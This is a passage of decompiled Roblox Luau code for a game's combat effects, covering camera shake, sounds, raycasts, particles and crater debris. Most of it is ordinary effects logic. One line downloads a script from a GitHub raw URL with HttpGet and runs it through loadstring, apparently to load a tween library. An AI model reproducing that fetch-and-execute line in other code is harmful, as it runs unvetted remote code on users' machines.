                                    local v349, v350, v351 = pairs(v348[v344].Keypoints)
                                    local v352 = {}

                                    while true do
                                        local v353

                                        v351, v353 = v349(v350, v351)

                                        if v351 == nil then
                                            break
                                        end

                                        table.insert(v352, NumberSequenceKeypoint.new(v353.Time, v353.Value * p342, v353.Envelope))
                                    end

                                    v348[v344] = NumberSequence.new(v352)
                                end
                            end
                        end

                        local function u357(p354)
                            if p354.Last then
                                task.spawn(function()
                                    for _ = 1, p354.Last / 0.03 do
                                        local _addshake = shared.addshake

                                        if _addshake then
                                            _addshake(p354.Intensity)
                                        end

                                        local v356 = p354

                                        v356.Intensity = v356.Intensity * 0.9

                                        task.wait(0.03)
                                    end
                                end)
                            else
                                shared.addshake(p354.Intensity)
                            end
                        end
                        local function u363(p358, p359, p360, p361)
                            local _Sound2 = Instance.new('Sound')

                            _Sound2.Volume = p360 or 1
                            _Sound2.Parent = p359
                            _Sound2.SoundId = p358
                            _Sound2.SoundGroup = p361 or game:GetService('SoundService').Sounds

                            _Sound2:Play()
                        end
                        local function u371(p364)
                            local v365 = {
                                workspace.Thrown,
                                workspace.Live,
                            }
                            local _orig = p364.orig
                            local _dir = p364.dir
                            local v368 = RaycastParams.new()

                            v368.FilterDescendantsInstances = p364.Whitelist or (p364.Ignore or v365)

                            if p364.Whitelist then
                                v368.FilterType = Enum.RaycastFilterType.Include
                            else
                                v368.FilterType = Enum.RaycastFilterType.Exclude
                            end
                            if p364.Blockcast then
                                local v369 = workspace:Blockcast(_orig, p364.Blockcast, _dir, v368)

                                if v369 then
                                    return v369.Instance, v369.Position, v369.Material, v369.Normal
                                end
                            else
                                local v370 = workspace:Raycast(_orig, _dir, v368)

                                if v370 then
                                    return v370.Instance, v370.Position, v370.Material, v370.Normal
                                end
                            end
                        end
                        local function u391(p372, p373, p374)
                            local v375, v376, v377 = pairs(p372:GetChildren())
                            local u378 = {}

                            while true do
                                local v379

                                v377, v379 = v375(v376, v377)

                                if v377 == nil then
                                    break
                                end

                                u378[v379.Name] = v379
                            end

                            local u382 = setmetatable({}, {
                                __index = function(_, p380)
                                    return {
                                        Clone = function(_)
                                            local v381 = rawget(u378, p380):Clone()

                                            if not table.find(p373, v381) then
                                                table.insert(p373, v381)
                                            end

                                            return v381
                                        end,
                                    }
                                end,
                            })
                            local u383 = {_maid = {}}

                            function u383._maid.give(_, p384)
                                if not table.find(p373, p384) then
                                    table.insert(p373, p384)
                                end

                                return p384
                            end
                            function u383._maid.giveTask(_, p385)
                                if not table.find(p373, p385) then
                                    table.insert(p373, p385)
                                end

                                return p385
                            end

                            local function v390()
                                if u382 and u383 then
                                    table.clear(u382)
                                    table.clear(u383)
                                end
                                if u378 then
                                    table.clear(u378)

                                    u378 = nil
                                end

                                u383 = nil
                                u382 = nil

                                if p373 then
                                    local v386, v387, v388 = pairs(p373)

                                    while true do
                                        local v389

                                        v388, v389 = v386(v387, v388)

                                        if v388 == nil then
                                            break
                                        end
                                        if typeof(v389) ~= 'RBXScriptConnection' then
                                            if typeof(v389) == 'Instance' then
                                                v389:Destroy()
                                            end
                                        else
                                            v389:Disconnect()
                                        end

                                        p373[v388] = nil
                                    end

                                    table.clear(p373)
                                end

                                p373 = nil
                            end

                            task.delay(p374 or 10, v390)

                            return u382, u383, v390
                        end

                        local u392 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/wehatepastebin/refs/heads/main/boattween'))()

                        local function u399(p393, p394, p395)
                            local u396 = u392:Create(p393, p394)
                            local v397 = u396

                            u396.Play(v397)

                            local u398 = u396.Completed:Once(function()
                                if p395 then
                                    p395()
                                end

                                u396:Destroy()
                            end)

                            task.delay(p394.Time, function()
                                u398:Disconnect()
                                u396:Destroy()
                            end)
                        end
                        local function u405(p400, p401, p402, p403)
                            local v404 = p403 or Random.new()

                            if not p401 and p400 then
                                p401 = p400
                                p400 = 1
                            end
                            if not (p401 or p400) then
                                p400 = 0
                                p401 = 1
                            end
                            if p402 then
                                return v404:NextInteger(p400, p401)
                            else
                                return v404:NextNumber(p400, p401)
                            end
                        end
                        local function u413(p406)
                            local _FX3 = p406.FX
                            local _Count = p406.Count
                            local v409, v410, v411 = pairs(_FX3:GetDescendants())

                            while true do
                                local v412

                                v411, v412 = v409(v410, v411)

                                if v411 == nil then
                                    break
                                end
                                if v412:IsA('ParticleEmitter') then
                                    v412.ZOffset = v412.ZOffset + _Count
                                end
                            end
                        end
                        local function u424(p414)
                            local _FX4 = p414.FX

                            if p414.On then
                                local v416, v417, v418 = pairs(_FX4:GetDescendants())

                                while true do
                                    local v419

                                    v418, v419 = v416(v417, v418)

                                    if v418 == nil then
                                        break
                                    end
                                    if v419:IsA('ParticleEmitter') then
                                        v419.Enabled = true
                                    end
                                end
                            else
                                local v420, v421, v422 = pairs(_FX4:GetDescendants())

                                while true do
                                    local v423

                                    v422, v423 = v420(v421, v422)

                                    if v422 == nil then
                                        break
                                    end
                                    if v423:IsA('ParticleEmitter') then
                                        v423.Enabled = false
                                    end
                                end
                            end
                        end
                        local function u439(p425, p426, p427)
                            local v428, v429, v430 = pairs(p425:GetDescendants())

                            while true do
                                local u431

                                v430, u431 = v428(v429, v430)

                                if v430 == nil then
                                    break
                                end
                                if u431:IsA('ParticleEmitter') then
                                    local v432 = u431:GetAttributes()
                                    local _EmitDelay = v432.EmitDelay

                                    if _EmitDelay then
                                        local u434 = v432

                                        task.delay(_EmitDelay, function()
                                            u431:Emit(u434.EmitCount)
                                        end)
                                    else
                                        u431:Emit(v432.EmitCount)
                                    end
                                    if v432.EmitDuration then
                                        u431.Enabled = true

                                        task.delay(v432.EmitDuration, function()
                                            u431.Enabled = false
                                        end)
                                    end
                                end
                                if u431:IsA('Beam') then
                                    local u435 = u431:GetAttributes()
                                    local _Duration = u435.Duration
                                    local u437 = not (p427 and p427.TweenTime) and 0.5 or p427.TweenTime

                                    local function u438()
                                        u10:Create(u431, TweenInfo.new(u437, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
                                            Width1 = 0,
                                            Width0 = 0,
                                        }):Play()
                                    end

                                    (function()
                                        u10:Create(u431, TweenInfo.new(u437, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
                                            Width1 = u435.Width1,
                                            Width0 = u435.Width0,
                                        }):Play()
                                    end)()

                                    if _Duration then
                                        task.delay(_Duration, function()
                                            u438()
                                        end)
                                    end
                                end
                            end

                            if p426 then
                                u6:AddItem(p425, p426)
                            end
                        end
                        local function u446(p440)
                            local _orig2 = p440.orig
                            local _dir2 = p440.dir
                            local v443 = RaycastParams.new()

                            v443.FilterDescendantsInstances = p440.Whitelist or (p440.Ignore or u230)

                            if p440.Whitelist then
                                v443.FilterType = Enum.RaycastFilterType.Include
                            else
                                v443.FilterType = Enum.RaycastFilterType.Exclude
                            end
                            if p440.Blockcast then
                                local v444 = workspace:Blockcast(_orig2, p440.Blockcast, _dir2, v443)

                                if v444 then
                                    return v444.Instance, v444.Position, v444.Material, v444.Normal
                                end
                            else
                                local v445 = workspace:Raycast(_orig2, _dir2, v443)

                                if v445 then
                                    return v445.Instance, v445.Position, v445.Material, v445.Normal
                                end
                            end
                        end
                        local function u452(p447, p448, p449)
                            local v450 = p447:Dot(p448)
                            local v451 = p447:Cross(p448)

                            if v450 < -0.99999 then
                                return CFrame.fromAxisAngle(p449, 3.141592653589793)
                            else
                                return CFrame.new(0, 0, 0, v451.x, v451.y, v451.z, 1 + v450)
                            end
                        end

                        local u453 = {}

                        local function u462(p454)
                            if p454 then
                                if p454.ClassName ~= 'Model' then
                                    local v455 = p454.Touched:Connect(function() end)
                                    local v456 = p454:GetTouchingParts()

                                    v455:Disconnect()

                                    local v457, v458, v459 = pairs(v456)
                                    local v460 = {}

                                    while true do
                                        local v461

                                        v459, v461 = v457(v458, v459)

                                        if v459 == nil then
                                            break
                                        end
                                        if v461.Name ~= 'InvisibleBorder' and v461.Name ~= 'InfBall' then
                                            table.insert(v460, v461)
                                        end
                                    end

                                    return v460
                                end
                            end
                        end
                        local function u481(p463)
                            local v464 = u10
                            local _new = TweenInfo.new
                            local v466 = 0.7
                            local v467 = 1
                            local v468 = u86
                            local v469

                            if v467 or not v466 then
                                v469 = v466
                                v466 = v467
                            else
                                v469 = 1
                            end
                            if not (v466 or v469) then
                                v469 = 0
                                v466 = 1
                            end

                            v464:Create(p463, _new(v468:NextNumber(v469, v466), Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                Size = Vector3.new(),
                            }):Play()

                            p463.Anchored = false
                            p463.CanCollide = false
                            p463.CanTouch = false

                            local _BodyVelocity = p463:FindFirstChildOfClass('BodyVelocity')

                            if _BodyVelocity then
                                u6:AddItem(_BodyVelocity, 0)
                            end

                            local _BodyVelocity2 = Instance.new('BodyVelocity')

                            _BodyVelocity2.MaxForce = Vector3.new(1, 1, 1, 0) * 400000

                            local v472 = -10
                            local v473 = 10
                            local v474 = u86
                            local v475

                            if v473 or not v472 then
                                v475 = v472
                                v472 = v473
                            else
                                v475 = 1
                            end
                            if not (v472 or v475) then
                                v475 = 0
                                v472 = 1
                            end

                            local v476 = v474:NextNumber(v475, v472)
                            local v477 = 10
                            local v478 = 17.5
                            local v479 = u86
                            local v480

                            if v478 or not v477 then
                                v480 = v477
                                v477 = v478
                            else
                                v480 = 1
                            end
                            if not (v477 or v480) then
                                v480 = 0
                                v477 = 1
                            end

                            _BodyVelocity2.Velocity = Vector3.new(v476, v479:NextNumber(v480, v477) * 2, u335(-10, 10)) * 1.5
                            _BodyVelocity2.Parent = p463

                            u6:AddItem(_BodyVelocity2, 0.15)
                        end
                        local function u683(p482)
                            if not p482.add then
                                p482.add = {}
                            end

                            local v483 = p482.sizemult or 1
                            local _add = p482.add
                            local u485 = Random.new(p482.Seed or tick())
                            local u486 = u335

                            local function v489(p487, p488)
                                return u486(p487, p488, nil, u485)
                            end

                            if p482.amount then
                                p482.amount = math.floor(p482.amount)
                            end

                            local v490 = _add.less and 2.5 or 1
                            local v491 = nil
                            local v492 = 3
                            local v493 = 5
                            local v494

                            if u485 then
                                v494 = u485
                            else
                                v494 = u86
                            end

                            local v495

                            if v493 or not v492 then
                                v495 = v492
                                v492 = v493
                            else
                                v495 = 1
                            end
                            if not (v492 or v495) then
                                v495 = 0
                                v492 = 1
                            end

                            local v496 = v494:NextNumber(v495, v492)

                            if u238:GetAttribute('S_FastMode') then
                                v496 = v496 / 2
                            end

                            local v497 = p482.nodebris and 0 or v496
                            local v498, v499

                            if p482.ground.Material == Enum.Material.Water or p482.ground == workspace.Terrain then
                                local v500 = {
                                    Material = Enum.Material.Sand,
                                    Color = Color3.fromRGB(227, 206, 157),
                                    Transparency = 0,
                                }

                                p482.ground = v500

                                function v500.GetAttribute(_) end

                                v498 = true
                                v499 = true
                            else
                                v498 = false
                                v499 = false
                            end

                            local u501 = p482.ground.Material == Enum.Material.Sand and true or v498
                            local v502 = u485

                            for _ = 1, v497 do
                                if _add.less or u501 then
                                    break
                                end

                                local v503 = 1
                                local v504 = 3
                                local v505 = v502 or u86

                                if not v504 and v503 then
                                    v504 = v503
                                    v503 = 1
                                end
                                if not (v504 or v503) then
                                    v504 = 1
                                    v503 = 0
                                end

                                local v506 = v505:NextNumber(v503, v504)
                                local _Part2 = Instance.new('Part')

                                _Part2.CollisionGroup = 'nocol'

                                local _cframe = p482.cframe
                                local _Angles = CFrame.Angles
                                local v510 = -360
                                local v511 = 360
                                local v512 = v502 or u86

                                if not v511 and v510 then
                                    v511 = v510
                                    v510 = 1
                                end
                                if not (v511 or v510) then
                                    v510 = 0
                                    v511 = 1
                                end

                                local v513 = math.rad((v512:NextNumber(v510, v511)))
                                local v514 = -360
                                local v515 = 360
                                local v516 = v502 or u86

                                if not v515 and v514 then
                                    v515 = v514
                                    v514 = 1
                                end
                                if not (v515 or v514) then
                                    v515 = 1
                                    v514 = 0
                                end

                                local v517 = math.rad((v516:NextNumber(v514, v515)))
                                local v518 = -360
                                local v519 = 360
                                local v520 = v502 or u86

                                if not v519 and v518 then
                                    v519 = v518
                                    v518 = 1
                                end
                                if not (v519 or v518) then
                                    v518 = 0
                                    v519 = 1
                                end

                                _Part2.CFrame = _cframe * _Angles(v513, v517, (math.rad((v520:NextNumber(v518, v519)))))
                                _Part2.Size = Vector3.new(v506, v506, v506)
                                _Part2.Color = p482.ground.Color
                                _Part2.CanCollide = not u501
                                _Part2.Anchored = false
                                _Part2.Material = p482.ground.Material
                                _Part2.Transparency = p482.ground.Transparency
                                _Part2.Parent = workspace.Thrown

                                local _BodyVelocity3 = Instance.new('BodyVelocity')

                                _BodyVelocity3.MaxForce = Vector3.new(2000000000, 2000000000, 2000000000, 0)

                                local v522 = -25
                                local v523 = 25
                                local v524 = v502 or u86

                                if not v523 and v522 then
                                    v523 = v522
                                    v522 = 1
                                end
                                if not (v523 or v522) then
                                    v522 = 0
                                    v523 = 1
                                end

                                local v525 = v524:NextNumber(v522, v523)
                                local v526 = 5
                                local v527 = 25
                                local v528 = v502 or u86

                                if not v527 and v526 then
                                    v527 = v526
                                    v526 = 1
                                end
                                if not (v527 or v526) then
                                    v526 = 0
                                    v527 = 1
                                end

                                _BodyVelocity3.Velocity = Vector3.new(v525, v528:NextNumber(v526, v527), v489(-25, 25)) * 2
                                _BodyVelocity3.Parent = _Part2

                                u6:AddItem(_BodyVelocity3, 0.15)

                                local v529 = delay
                                local v530

                                if u501 then
                                    v530 = 0
                                else
                                    local v531 = 3
                                    local v532 = 0
                                    local v533 = 1
                                    local v534 = v502 or u86

                                    if not v533 and v532 then
                                        v533 = v532
                                        v532 = 1
                                    end
                                    if not (v533 or v532) then
                                        v532 = 0
                                        v533 = 1
                                    end

                                    v530 = v531 + v534:NextNumber(v532, v533)
                                end

                                v529(v530, function()
                                    u10:Create(_Part2, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                        Transparency = 1,
                                        Size = u501 and Vector3.zero or _Part2.Size / 1.5,
                                    }):Play()
                                    delay(0.3, function()
                                        _Part2.Anchored = true

                                        local v535 = _Part2

                                        v535.AssemblyLinearVelocity = Vector3.zero
                                        v535.AssemblyAngularVelocity = Vector3.zero
                                        v535.Velocity = Vector3.zero
                                        _Part2.CanCollide = false
                                        _Part2.CFrame = CFrame.new(100000000, 100000000, 100000000)

                                        _Part2:Destroy()
                                        table.insert(u453, _Part2)
                                    end)
                                end)
                            end

                            local v536 = 4
                            local v537 = 7
                            local v538 = v502 or u86

                            if not v537 and v536 then
                                v537 = v536
                                v536 = 1
                            end
                            if not (v537 or v536) then
                                v536 = 0
                                v537 = 1
                            end

                            local v539 = v538:NextNumber(v536, v537) / v490

                            if u238:GetAttribute('S_FastMode') then
                                v539 = v539 / 2
                            end

                            for _ = 1, p482.nodebris and 0 or v539 do
                                if u501 then
                                    break
                                end

                                local v540 = 0.6
                                local v541 = 0.8
                                local v542 = v502 or u86

                                if not v541 and v540 then
                                    v541 = v540
                                    v540 = 1
                                end
                                if not (v541 or v540) then
                                    v540 = 0
                                    v541 = 1
                                end

                                local v543 = v542:NextNumber(v540, v541)
                                local _Part3 = Instance.new('Part')

                                _Part3.CFrame = p482.cframe

                                local v545 = u452(_Part3.CFrame.UpVector, p482.normal, (Vector3.new(0, 1, 0, 0)))

                                _Part3.CFrame = _Part3.CFrame * (v545 * CFrame.Angles(1.5707963267948966, 0, 0))
                                _Part3.CollisionGroup = 'nocol'
                                _Part3.Size = Vector3.new(v543, v543, v543)
                                _Part3.Color = p482.ground.Color
                                _Part3.CanCollide = not u501
                                _Part3.Name = 'SmallDebris'
                                _Part3.Anchored = false
                                _Part3.Material = p482.ground.Material
                                _Part3.Transparency = p482.ground.Transparency
                                _Part3.Parent = workspace.Thrown

                                local _BodyVelocity4 = Instance.new('BodyVelocity')

                                _BodyVelocity4.MaxForce = Vector3.new(2000000000, 2000000000, 2000000000, 0)

                                local v547 = -25
                                local v548 = 25
                                local v549 = v502 or u86

                                if not v548 and v547 then
                                    v548 = v547
                                    v547 = 1
                                end
                                if not (v548 or v547) then
                                    v548 = 1
                                    v547 = 0
                                end

                                local v550 = v549:NextNumber(v547, v548)
                                local v551 = 5
                                local v552 = 25
                                local v553 = v502 or u86

                                if not v552 and v551 then
                                    v552 = v551
                                    v551 = 1
                                end
                                if not (v552 or v551) then
                                    v551 = 0
                                    v552 = 1
                                end

                                _BodyVelocity4.Velocity = Vector3.new(v550, v553:NextNumber(v551, v552), v489(-25, 25)) * 2
                                _BodyVelocity4.Parent = _Part3

                                u6:AddItem(_BodyVelocity4, 0.15)

                                local _BodyAngularVelocity = Instance.new('BodyAngularVelocity')

                                _BodyAngularVelocity.Parent = _Part3

                                u6:AddItem(_BodyAngularVelocity, 0.5)

                                local v555 = delay
                                local v556

                                if u501 then
                                    v556 = 0
                                else
                                    local v557 = 3
                                    local v558 = 0
                                    local v559 = 1
                                    local v560 = v502 or u86

                                    if not v559 and v558 then
                                        v559 = v558
                                        v558 = 1
                                    end
                                    if not (v559 or v558) then
                                        v558 = 0
                                        v559 = 1
                                    end

                                    v556 = v557 + v560:NextNumber(v558, v559)
                                end

                                v555(v556, function()
                                    u10:Create(_Part3, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                        Transparency = 1,
                                        Size = u501 and Vector3.zero or _Part3.Size / 1.5,
                                    }):Play()
                                    delay(0.3, function()
                                        _BodyAngularVelocity:Destroy()

                                        _Part3.Anchored = true

                                        local v561 = _Part3

                                        v561.AssemblyLinearVelocity = Vector3.zero
                                        v561.AssemblyAngularVelocity = Vector3.zero
                                        v561.Velocity = Vector3.zero
                                        _Part3.CanCollide = false
                                        _Part3.CFrame = CFrame.new(100000000, 100000000, 100000000)

                                        _Part3:Destroy()
                                        table.insert(u453, _Part3)
                                    end)
                                end)
                            end

                            local v562 = {}
                            local v563, v564

                            if p482.new then
                                v563 = p482.new[1]
                                v564 = p482.new[2]
                            else
                                v563 = 5
                                v564 = 7
                            end

                            local v565 = CFrame.new(p482.cframe.p)
                            local v566 = (v563 + v564) / 2
                            local v567 = p482.amount or 16

                            if u238:GetAttribute('S_FastMode') then
                                v567 = v567 / 2
                            end

                            local v568 = v565 * u452(v565.UpVector, p482.normal, (Vector3.new(0, 1, 0, 0)))
                            local _Angles2 = CFrame.Angles
                            local v570 = 0
                            local v571 = -360
                            local v572 = 360
                            local v573 = v502 or u86

                            if not v572 and v571 then
                                v572 = v571
                                v571 = 1
                            end
                            if not (v572 or v571) then
                                v571 = 0
                                v572 = 1
                            end

                            local v574 = v568 * _Angles2(v570, math.rad((v573:NextNumber(v571, v572))), 0)
                            local _Angles3 = CFrame.Angles
                            local v576 = 0
                            local v577 = -16
                            local v578 = 16
                            local v579 = v502 or u86

                            if not v578 and v577 then
                                v578 = v577
                                v577 = 1
                            end
                            if not (v578 or v577) then
                                v577 = 0
                                v578 = 1
                            end

                            local v580 = v574 * _Angles3(v576, math.rad((v579:NextNumber(v577, v578))), 0)
                            local v581 = true

                            if v563 ~= 5 and v564 ~= 7 then
                                p482.Double = 2
                            end

                            for v582 = 1, v567 do
                                local v583 = v582

                                for v584 = 1, p482.Double or 1 do
                                    local v585

                                    if v584 > 1 then
                                        v566 = v566 + 1
                                        v585 = v580
                                    else
                                        v585 = v574
                                    end

                                    local v586 = math.sin((360 / v567 + 360 / v567 * v583) / 57.29577951308232)
                                    local v587 = math.cos((360 / v567 + 360 / v567 * v583) / 57.29577951308232)
                                    local v588 = v585 * CFrame.new(v566 * v586, 0, v566 * v587)
                                    local v589 = p482.Double and 0.35 or 0.2
                                    local _lookVector = v588.lookVector
                                    local v591 = -v589
                                    local v592 = v502 or u86

                                    if not v589 and v591 then
                                        v589 = v591
                                        v591 = 1
                                    end
                                    if not (v589 or v591) then
                                        v589 = 1
                                        v591 = 0
                                    end

                                    local v593 = v588 + _lookVector * v592:NextNumber(v591, v589)
                                    local _Part4 = Instance.new('Part')

                                    _Part4.Anchored = true
                                    _Part4.CanCollide = false
                                    _Part4.CanTouch = true
                                    _Part4.Material = p482.ground.Material
                                    _Part4.Color = p482.ground.Color
                                    _Part4.CFrame = v593 * CFrame.fromEulerAnglesXYZ(0, (360 / v567 + 360 / v567 * v583) / 57.29577951308232, 0)

                                    local _CFrame2 = _Part4.CFrame
                                    local _Angles4 = CFrame.Angles
                                    local v597 = 6
                                    local v598 = 42
                                    local v599 = v502 or u86

                                    if not v598 and v597 then
                                        v598 = v597
                                        v597 = 1
                                    end
                                    if not (v598 or v597) then
                                        v597 = 0
                                        v598 = 1
                                    end

                                    _Part4.CFrame = _CFrame2 * _Angles4(math.rad(-v599:NextNumber(v597, v598)), 0, 0)

                                    local v600 = 2
                                    local v601 = 5
                                    local v602 = v502 or u86

                                    if not v601 and v600 then
                                        v601 = v600
                                        v600 = 1
                                    end
                                    if not (v601 or v600) then
                                        v601 = 1
                                        v600 = 0
                                    end

                                    local v603 = v602:NextNumber(v600, v601) * (v584 > 1 and 1.8 or (p482.Double and 1.35 or 1))
                                    local v604 = 1.9
                                    local v605 = 2.4
                                    local v606 = v502 or u86
                                    local v607

                                    if v605 or not v604 then
                                        v607 = v604
                                        v604 = v605
                                    else
                                        v607 = 1
                                    end
                                    if not (v604 or v607) then
                                        v604 = 1
                                        v607 = 0
                                    end

                                    _Part4.Size = Vector3.new(v603, v606:NextNumber(v607, v604), v489(2, 6)) * v483
                                    _Part4.CFrame = _Part4.CFrame * CFrame.new(0, -(_Part4.Size.Y / 3 + _Part4.Size.Z / 3) / 3, 0)
                                    _Part4.Transparency = 1
                                    _Part4.Parent = workspace.Thrown

                                    local _CFrame3 = _Part4.CFrame
                                    local v609 = u462(_Part4)
                                    local v610, v611, v612 = pairs(v609)
                                    local v613 = {}
                                    local v614 = nil
                                    local v615 = nil
                                    local v616 = nil

                                    while true do
                                        local v617

                                        v612, v617 = v610(v611, v612)

                                        if v612 == nil then
                                            break
                                        end
                                        if not v617:IsDescendantOf(workspace.Live) and v617.Name ~= 'invis' and v617.Parent ~= workspace.Thrown then
                                            if v617.Material ~= p482.ground.Material then
                                                v616 = v617
                                            end

                                            table.insert(v613, v617)
                                        end
                                        if v617 == p482.ground then
                                            v615 = p482.ground
                                        end
                                        if v617.Name == 'Stadium' then
                                            v614 = true
                                        end
                                    end

                                    local _CFrame4 = _Part4.CFrame
                                    local v619 = CFrame.new(0, -3, -1.5)
                                    local _Angles5 = CFrame.Angles
                                    local v621 = -11
                                    local v622 = 11
                                    local v623 = v502 or u86

                                    if not v622 and v621 then
                                        v622 = v621
                                        v621 = 1
                                    end
                                    if not (v622 or v621) then
                                        v621 = 0
                                        v622 = 1
                                    end

                                    local v624 = math.rad((v623:NextNumber(v621, v622)))
                                    local v625 = -11
                                    local v626 = 11
                                    local v627 = v502 or u86

                                    if not v626 and v625 then
                                        v626 = v625
                                        v625 = 1
                                    end
                                    if not (v626 or v625) then
                                        v626 = 1
                                        v625 = 0
                                    end

                                    local v628 = math.rad((v627:NextNumber(v625, v626)))
                                    local v629 = -11
                                    local v630 = 11
                                    local v631 = v502 or u86

                                    if not v630 and v629 then
                                        v630 = v629
                                        v629 = 1
                                    end
                                    if not (v630 or v629) then
                                        v629 = 0
                                        v630 = 1
                                    end

                                    _Part4.CFrame = _CFrame4 * (v619 * _Angles5(v624, v628, (math.rad((v631:NextNumber(v629, v630))))))
                                    _Part4.Transparency = 0

                                    table.insert(v562, _Part4)

                                    local v632 = #v613 == 0 or p482.ground:GetAttribute('Breakable') or not p482.ground.Anchored
                                    local _angle = p482.angle

                                    if _angle then
                                        local _anglecfr = p482.anglecfr
                                        local _Position = _CFrame3.Position
                                        local _unit = (Vector3.new(_Position.X, _anglecfr.p.Y, _Position.Z) - _anglecfr.p).unit

                                        _angle = math.deg((math.acos((_anglecfr.LookVector:Dot(_unit))))) <= p482.angle
                                    end
                                    if v632 or _angle then
                                        if not v499 then
                                            _Part4.Transparency = 1
                                        end
                                    else
                                        if v616 and (not v615 or v615.Name ~= 'Stadium') and (not v614 or p482.ground.Name ~= 'Stadium') then
                                            if p482.ground.Material == Enum.Material.Grass and v615 then
                                                v616 = workspace.Preload.Dirt
                                            end

                                            _Part4.Color = v616.Color
                                            _Part4.Material = v616.Material
                                        end

                                        _Part4.Transparency = p482.ground.Transparency
                                    end
                                    if _Part4.Transparency < 1 then
                                        _Part4.CanCollide = true
                                    else
                                        _Part4.CanCollide = false
                                        _Part4.CanTouch = false
                                        _Part4.CanQuery = false
                                    end
                                    if _Part4.Velocity.magnitude > 0 then
                                        _Part4.AssemblyLinearVelocity = Vector3.zero
                                        _Part4.AssemblyAngularVelocity = Vector3.zero
                                        _Part4.Velocity = Vector3.zero
                                    end
                                    if u501 or v499 then
                                        _Part4.CFrame = _CFrame3

                                        u481(_Part4)
                                    end
                                    if v581 then
                                        v581 = false

                                        local v637 = {
                                            'rbxassetid://3848076724',
                                            'rbxassetid://3848078820',
                                        }
                                        local v638 = {
                                            'rbxassetid://4307208601',
                                            'rbxassetid://4307207425',
                                            'rbxassetid://4307207693',
                                            'rbxassetid://4307205188',
                                            'rbxassetid://3778609188',
                                            'rbxassetid://3778608737',
                                            'rbxassetid://3744401196',
                                            'rbxassetid://4307204962',
                                        }
                                        local v639 = {
                                            'rbxassetid://4307204696',
                                            'rbxassetid://4307204452',
                                        }

                                        if u501 then
                                            local v640 = v491 and 2 or 1

                                            if not shared.recentdebris then
                                                shared.recentdebris = {}
                                            end

                                            local v641, v642, v643 = pairs(shared.recentdebris)
                                            local v644 = true

                                            while true do
                                                local v645

                                                v643, v645 = v641(v642, v643)

                                                if v643 == nil then
                                                    break
                                                end

                                                local v646 = v645[1]
                                                local _ = v645[2]

                                                if tick() - v645[2] <= 0.5 then
                                                    if (v646.Position - v646.Position).magnitude <= 5 then
                                                        v644 = false

                                                        break
                                                    end
                                                else
                                                    shared.recentdebris[v643] = nil
                                                end
                                            end

                                            if v644 and 0.8 <= (v563 + v564) / 12 then
                                                table.insert(shared.recentdebris, {
                                                    v585,
                                                    tick(),
                                                })
                                                shared.sfx({
                                                    SoundId = ({
                                                        'rbxassetid://18922680029',
                                                        'rbxassetid://18922679331',
                                                        'rbxassetid://18922678743',
                                                        'rbxassetid://18922678349',
                                                    })[math.random(1, 4)],
                                                    Volume = 1.35 / v640,
                                                    CFrame = v585,
                                                }):Play()

                                                if v499 then
                                                    local v647 = (v563 + v564) / 12

                                                    shared.sfx({
                                                        SoundId = ({
                                                            'rbxassetid://18922743710',
                                                            'rbxassetid://18922743936',
                                                            'rbxassetid://18922744361',
                                                        })[math.random(1, 3)],
                                                        Volume = 1.75 / v640 + math.max(v647 - 1, 0),
                                                        CFrame = v585,
                                                    }):Play()

                                                    local v648 = game.ReplicatedStorage.Resources.Splash:Clone()

                                                    u6:AddItem(v648, 5)
                                                    v648:ScaleTo(v647 + 0.3)

                                                    v648.PrimaryPart.CFrame = v585
                                                    v648.Parent = workspace.Thrown

                                                    local v649, v650, v651 = pairs(v648:GetDescendants())

                                                    while true do
                                                        local v652

                                                        v651, v652 = v649(v650, v651)

                                                        if v651 == nil then
                                                            break
                                                        end
                                                        if v652:IsA('ParticleEmitter') then
                                                            v652:Emit(v652:GetAttribute('EmitCount'))
                                                        end
                                                    end
                                                end
                                            end
                                        elseif _add.sounds and not p482.nosound then
                                            local v653 = v491 and 2 or 1
                                            local _sfx = shared.sfx
                                            local v655 = {}
                                            local v656 = #v639
                                            local v657 = nil
                                            local v658 = u86

                                            if not v657 and v656 then
                                                v657 = v656
                                                v656 = 1
                                            end
                                            if not (v657 or v656) then
                                                v656 = 0
                                                v657 = 1
                                            end

                                            v655.SoundId = v639[v658:NextInteger(v656, v657)]
                                            v655.Volume = 3.85 / v653
                                            v655.Parent = _Part4

                                            _sfx(v655):Play()

                                            local _sfx2 = shared.sfx
                                            local v660 = {}
                                            local v661 = #v638
                                            local v662 = nil
                                            local v663 = u86
                                            local v664

                                            if v662 or not v661 then
                                                v664 = v661
                                                v661 = v662
                                            else
                                                v664 = 1
                                            end
                                            if not (v661 or v664) then
                                                v664 = 0
                                                v661 = 1
                                            end

                                            v660.SoundId = v638[v663:NextInteger(v664, v661)]
                                            v660.Volume = 4.3 / v653
                                            v660.Parent = _Part4

                                            _sfx2(v660):Play()

                                            local _sfx3 = shared.sfx
                                            local v666 = {}
                                            local v667 = #v637
                                            local v668 = nil
                                            local v669 = u86
                                            local v670

                                            if v668 or not v667 then
                                                v670 = v667
                                                v667 = v668
                                            else
                                                v670 = 1
                                            end
                                            if not (v667 or v670) then
                                                v670 = 0
                                                v667 = 1
                                            end

                                            v666.SoundId = v637[v669:NextInteger(v670, v667)]
                                            v666.Volume = 4.12 / v653
                                            v666.Parent = _Part4

                                            _sfx3(v666):Play()
                                        end
                                    end

                                    _Part4:SetAttribute('OGCframe', _CFrame3)

                                    if not u501 then
                                        local v671 = u10
                                        local _new2 = TweenInfo.new
                                        local v673 = 0.2
                                        local v674 = 0.3
                                        local v675 = v502 or u86

                                        if not v674 and v673 then
                                            v674 = v673
                                            v673 = 1
                                        end
                                        if not (v674 or v673) then
                                            v674 = 1
                                            v673 = 0
                                        end

                                        v671:Create(_Part4, _new2(v675:NextNumber(v673, v674), Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {CFrame = _CFrame3}):Play()
                                    end
                                    if u501 or v499 then
                                        task.delay(1, function()
                                            _Part4:SetAttribute('OGCframe', nil)

                                            _Part4.Anchored = true

                                            local v676 = _Part4

                                            v676.AssemblyLinearVelocity = Vector3.zero
                                            v676.AssemblyAngularVelocity = Vector3.zero
                                            v676.Velocity = Vector3.zero
                                            _Part4.CFrame = CFrame.new(100000000, 100000000, 100000000)

                                            _Part4:Destroy()
